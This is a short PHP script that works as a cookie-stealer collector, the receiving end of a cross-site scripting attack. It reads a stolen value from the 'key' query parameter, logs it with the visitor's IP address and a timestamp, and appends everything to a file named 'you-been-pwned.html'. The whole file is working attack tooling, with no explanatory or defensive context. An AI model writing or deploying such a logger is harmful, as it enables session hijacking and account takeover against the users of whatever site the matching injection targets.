<?php

$file = fopen('you-been-pwned.html','a');

$cookie = $_GET['key'];

$ip = getenv ('REMOTE_ADDR');

$re = $HTTPREFERRER;

$date=date("j F, Y, g:i a");

fwrite($file, '<br />Key: '.htmlentities($cookie));
fwrite($file, '<br /> IP: ' .$ip. '<br /> Date: ' .$date. '</hr>');

fclose($file);

?>
